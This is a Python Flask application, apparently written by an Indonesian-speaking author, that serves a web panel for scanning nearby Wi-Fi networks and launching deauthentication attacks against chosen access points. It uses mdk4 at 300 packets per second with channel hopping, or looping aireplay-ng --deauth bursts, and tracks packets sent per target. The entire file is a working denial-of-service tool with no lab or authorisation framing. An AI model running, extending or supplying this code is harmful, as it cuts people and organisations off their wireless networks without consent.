from flask import Flask, render_template, request, jsonify
import subprocess
import os
import time
import signal
import sys
import re
import atexit
import glob
import threading
import json

app = Flask(__name__)

# ====================== GLOBAL VARIABLES ======================
monitor_iface = None
original_iface = None
deauth_process = None
deauth_running = False
deauth_stats = {}
deauth_total_packets = 0
deauth_start_time = None

# ====================== FUNGSI MANAJEMEN INTERFACE ======================

def find_wireless_interfaces():
    result = subprocess.run(["iwconfig"], capture_output=True, text=True)
    lines = result.stdout.split('\n')
    interfaces = []
    for line in lines:
        if "no wireless extensions" in line:
            continue
        if line.strip() and not line.startswith(" "):
            iface = line.split()[0]
            if iface not in ["lo", "eth0", "eth1"]:
                interfaces.append(iface)
    return interfaces

def is_monitor_mode(iface):
    result = subprocess.run(["iwconfig", iface], capture_output=True, text=True)
    return "Mode:Monitor" in result.stdout

def start_monitor_mode(iface):
    print(f"[*] Starting monitor mode on {iface}...")
    subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=False)
    result = subprocess.run(["sudo", "airmon-ng", "start", iface], capture_output=True, text=True)
    for line in result.stdout.split('\n'):
        if "monitor mode enabled on" in line:
            parts = line.split()
            for i, part in enumerate(parts):
                if part == "on" and i+1 < len(parts):
                    new_iface = parts[i+1].strip()
                    print(f"[+] Monitor interface: {new_iface}")
                    return new_iface
    interfaces = find_wireless_interfaces()
    for i in interfaces:
        if "mon" in i and i != iface:
            print(f"[+] Found monitor interface: {i}")
            return i
    raise RuntimeError("Could not determine monitor interface name")

def stop_monitor_mode(iface):
    if iface and iface != original_iface:
        print(f"[*] Stopping monitor mode on {iface}...")
        subprocess.run(["sudo", "airmon-ng", "stop", iface], check=False)
    print("[*] Restarting NetworkManager...")
    subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], check=False)

def ensure_monitor_mode():
    global monitor_iface, original_iface
    interfaces = find_wireless_interfaces()
    for iface in interfaces:
        if is_monitor_mode(iface):
            monitor_iface = iface
            print(f"[+] Found existing monitor interface: {monitor_iface}")
            return monitor_iface
    for iface in interfaces:
        if not is_monitor_mode(iface) and not iface.startswith("mon"):
            original_iface = iface
            try:
                new_iface = start_monitor_mode(iface)
                monitor_iface = new_iface
                print(f"[+] Successfully created monitor interface: {monitor_iface}")
                return monitor_iface
            except Exception as e:
                print(f"[-] Failed to start monitor on {iface}: {e}")
                continue
    raise RuntimeError("No wireless interface available")

def get_monitor_interface():
    global monitor_iface
    if monitor_iface and is_monitor_mode(monitor_iface):
        return monitor_iface
    interfaces = find_wireless_interfaces()
    for iface in interfaces:
        if is_monitor_mode(iface):
            monitor_iface = iface
            return monitor_iface
    return ensure_monitor_mode()

def check_mdk4_installed():
    try:
        subprocess.run(["which", "mdk4"], capture_output=True, check=True)
        return True
    except:
        return False

def check_aireplay_installed():
    try:
        subprocess.run(["which", "aireplay-ng"], capture_output=True, check=True)
        return True
    except:
        return False

# ====================== DEAUTH FUNCTIONS ======================

def deauth_with_mdk4(targets, interface):
    """
    Deauth multi-target dengan MDK4 - BALANCED MODE
    Tidak terlalu OP, cukup efektif
    """
    global deauth_running, deauth_stats, deauth_total_packets, deauth_start_time
    
    if not check_mdk4_installed():
        print("[-] MDK4 not installed!")
        return None
    
    deauth_start_time = time.time()
    
    # Buat file blacklist
    blacklist_file = "/tmp/mdk4_blacklist.txt"
    with open(blacklist_file, 'w') as f:
        for target in targets:
            f.write(target['bssid'] + '\n')
    
    # MDK4 command - BALANCED (tidak terlalu OP)
    # -s 300 = 300 packets/second (cukup untuk deauth, tidak overload interface)
    # -m 1 = target 1 client per BSSID (efisien)
    # -c = channel hopping otomatis
    cmd = [
        "sudo", "mdk4", interface,
        "d",  # Deauth mode
        "-b", blacklist_file,  # Blacklist BSSID
        "-s", "300",  # 300 packets/sec - BALANCED!
        "-m", "1",  # 1 client per BSSID
        "-c"  # Channel hopping
    ]
    
    print(f"[*] Starting MDK4 deauth (BALANCED mode)")
    print(f"[*] Targets: {len(targets)}")
    print(f"[*] Packet rate: 300/s")
    
    try:
        # Jalankan MDK4
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        
        # Thread untuk update stats
        def update_stats():
            global deauth_stats, deauth_total_packets
            packet_count = 0
            while deauth_running:
                try:
                    line = process.stdout.readline()
                    if line:
                        # Cari angka paket di output
                        numbers = re.findall(r'\d+', line)
                        if numbers:
                            # Ambil angka terakhir yang muncul (biasanya packet count)
                            new_packets = int(numbers[-1])
                            if new_packets > packet_count:
                                deauth_total_packets += (new_packets - packet_count)
                                packet_count = new_packets
                except:
                    pass
                time.sleep(0.5)
        
        stats_thread = threading.Thread(target=update_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Update stats per target
        for target in targets:
            bssid = target['bssid']
            deauth_stats[bssid] = {
                'bssid': bssid,
                'channel': target.get('channel', '?'),
                'essid': target.get('essid', 'Unknown'),
                'packets': 0,
                'status': 'attacking'
            }
        
        return process
        
    except Exception as e:
        print(f"[-] Failed to start MDK4: {e}")
        return None

def deauth_with_aireplay(targets, interface):
    """
    Fallback ke aireplay-ng jika MDK4 tidak tersedia
    Multi-target dengan sequential
    """
    global deauth_running, deauth_stats, deauth_total_packets, deauth_start_time
    
    if not check_aireplay_installed():
        print("[-] aireplay-ng not installed!")
        return None
    
    deauth_start_time = time.time()
    print("[*] MDK4 not available, using aireplay-ng fallback")
    
    # Thread untuk menjalankan attack sequential
    def attack_loop():
        global deauth_running, deauth_stats, deauth_total_packets
        
        # Inisialisasi stats
        for target in targets:
            bssid = target['bssid']
            deauth_stats[bssid] = {
                'bssid': bssid,
                'channel': target.get('channel', '?'),
                'essid': target.get('essid', 'Unknown'),
                'packets': 0,
                'status': 'attacking'
            }
        
        packet_per_burst = 30  # 30 packets per target per cycle
        cycle_count = 0
        
        while deauth_running:
            for target in targets:
                if not deauth_running:
                    break
                
                bssid = target['bssid']
                channel = target.get('channel', '1')
                
                # Set channel
                try:
                    subprocess.run(["iwconfig", interface, "channel", str(channel)], 
                                 capture_output=True, timeout=1)
                except:
                    pass
                
                # Attack
                cmd = f"sudo aireplay-ng --deauth {packet_per_burst} -a {bssid} {interface}"
                try:
                    result = subprocess.run(cmd, shell=True, timeout=2, capture_output=True, text=True)
                    if bssid in deauth_stats:
                        deauth_stats[bssid]['packets'] += packet_per_burst
                        deauth_total_packets += packet_per_burst
                except:
                    pass
                
                # Jeda antar target (biar tidak overload)
                time.sleep(0.3)
            
            cycle_count += 1
            # Jeda antar cycle
            time.sleep(0.5)
    
    thread = threading.Thread(target=attack_loop)
    thread.daemon = True
    thread.start()
    
    # Return dummy process untuk tracking
    class DummyProcess:
        def __init__(self):
            self.thread = thread
        def terminate(self):
            global deauth_running
            deauth_running = False
        def wait(self, timeout=3):
            self.thread.join(timeout=timeout)
    
    return DummyProcess()

# ====================== ROUTES ======================

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/scan', methods=['GET'])
def scan_wifi():
    try:
        interface = get_monitor_interface()
        print(f"[*] Scanning with {interface}...")
        
        # Bersihkan file lama
        for f in glob.glob("/tmp/scan_output*.csv"):
            try:
                os.remove(f)
            except:
                pass
        
        cmd = f"timeout 12 sudo airodump-ng {interface} -w /tmp/scan_output --output-format csv"
        subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        possible_files = [
            "/tmp/scan_output-01.csv",
            "/tmp/scan_output-02.csv",
            "/tmp/scan_output-03.csv",
            "/tmp/scan_output.csv"
        ]
        
        networks = []
        for f in possible_files:
            if os.path.exists(f):
                print(f"[*] Parsing file: {f}")
                networks = parse_csv(f)
                if networks:
                    break
        
        if networks:
            networks.sort(key=lambda x: x['power'] if x['power'] is not None else -1000, reverse=True)
            print(f"[+] Found {len(networks)} networks")
            return jsonify({"status": "success", "networks": networks})
        else:
            return jsonify({"status": "success", "networks": []})
            
    except Exception as e:
        print(f"[-] Error during scan: {e}")
        return jsonify({"status": "error", "message": str(e)})

def parse_csv(filename):
    networks = []
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    except FileNotFoundError:
        return networks

    start_parsing = False
    for i, line in enumerate(lines):
        if "bssid" in line.lower() and "channel" in line.lower() and "essid" in line.lower():
            start_parsing = True
            continue
        if start_parsing:
            if line.strip() == "" or "station mac" in line.lower():
                break
            parts = line.split(',')
            if len(parts) >= 14:
                bssid = parts[0].strip()
                channel = parts[3].strip()
                essid = parts[13].strip()
                power_str = parts[8].strip() if len(parts) > 8 else ''
                try:
                    power = int(power_str)
                except:
                    power = None
                if bssid and len(bssid) == 17 and ":" in bssid:
                    networks.append({
                        "bssid": bssid,
                        "channel": channel if channel else "?",
                        "essid": essid if essid else "[Hidden]",
                        "power": power,
                        "signal_level": get_signal_level(power),
                        "security": parts[5].strip() if len(parts) > 5 else "WPA2/PSK"
                    })
    return networks

def get_signal_level(power):
    if power is None:
        return "Almost Hilang"
    if power > -50:
        return "Kuat"
    elif power > -70:
        return "Sedang"
    elif power > -85:
        return "Lemah"
    else:
        return "Almost Hilang"

@app.route('/start_deauth', methods=['POST'])
def start_deauth():
    global deauth_process, deauth_running, deauth_stats, deauth_total_packets, deauth_start_time
    
    data = request.json
    targets = data.get('targets')
    
    if not targets or len(targets) == 0:
        return jsonify({"status": "error", "message": "No targets selected"})
    
    interface = get_monitor_interface()
    if not interface:
        return jsonify({"status": "error", "message": "Monitor interface not found"})
    
    # Stop existing attack
    stop_deauth_process()
    
    # Reset stats
    deauth_stats = {}
    deauth_total_packets = 0
    deauth_start_time = None
    deauth_running = True
    
    # Coba MDK4 dulu, fallback ke aireplay
    if check_mdk4_installed():
        process = deauth_with_mdk4(targets, interface)
        method = "MDK4"
    else:
        process = deauth_with_aireplay(targets, interface)
        method = "aireplay-ng (fallback)"
    
    if process:
        deauth_process = process
        return jsonify({
            "status": "success",
            "message": f"Deauth started with {method}",
            "method": method,
            "targets": len(targets),
            "target_list": [t['bssid'][:8] + ".." for t in targets[:5]]
        })
    else:
        deauth_running = False
        return jsonify({
            "status": "error",
            "message": "Failed to start deauth. Make sure MDK4 or aircrack-ng is installed."
        })

@app.route('/stop_deauth', methods=['POST'])
def stop_deauth():
    stop_deauth_process()
    
    duration = "N/A"
    if deauth_start_time:
        elapsed = time.time() - deauth_start_time
        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        duration = f"{minutes}m {seconds}s"
    
    return jsonify({
        "status": "success",
        "message": "Deauth stopped",
        "total_packets": deauth_total_packets,
        "duration": duration,
        "stats": deauth_stats
    })

@app.route('/deauth_status', methods=['GET'])
def deauth_status():
    global deauth_running, deauth_stats, deauth_total_packets, deauth_start_time
    
    duration = "N/A"
    if deauth_start_time and deauth_running:
        elapsed = time.time() - deauth_start_time
        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        duration = f"{minutes}m {seconds}s"
    
    # Hitung total target
    total_targets = len(deauth_stats)
    active_targets = sum(1 for s in deauth_stats.values() if s.get('status') == 'attacking')
    
    return jsonify({
        "running": deauth_running,
        "stats": deauth_stats,
        "total_packets": deauth_total_packets,
        "total_targets": total_targets,
        "active_targets": active_targets,
        "duration": duration,
        "method": "MDK4" if check_mdk4_installed() else "aireplay-ng"
    })

def stop_deauth_process():
    global deauth_running, deauth_process
    deauth_running = False
    
    if deauth_process:
        try:
            deauth_process.terminate()
            deauth_process.wait(timeout=3)
        except:
            pass
        deauth_process = None
    
    # Kill semua proses deauth
    subprocess.run("sudo pkill -f 'mdk4'", shell=True, check=False)
    subprocess.run("sudo pkill -f 'aireplay-ng --deauth'", shell=True, check=False)
    
    # Bersihkan file temp
    for f in ["/tmp/mdk4_blacklist.txt"]:
        try:
            os.remove(f)
        except:
            pass

# ====================== CLEANUP ======================

def cleanup():
    print("\n[*] Cleaning up...")
    stop_deauth_process()
    if monitor_iface:
        stop_monitor_mode(monitor_iface)
    print("[+] Cleanup complete.")

def signal_handler(sig, frame):
    cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)
atexit.register(cleanup)

# ====================== MAIN ======================

if __name__ == '__main__':
    try:
        ensure_monitor_mode()
        print(f"[*] Monitor interface ready: {monitor_iface}")
        
        if check_mdk4_installed():
            print("[+] MDK4 detected - using fast deauth")
        else:
            print("[!] MDK4 not found - using aireplay-ng fallback")
            print("[!] Install MDK4: sudo apt install mdk4")
        
        print("[*] Starting Flask server on 0.0.0.0:5000 ...")
        app.run(host='0.0.0.0', port=5000, debug=False)
    except Exception as e:
        print(f"[-] Fatal error: {e}")
        cleanup()
        sys.exit(1)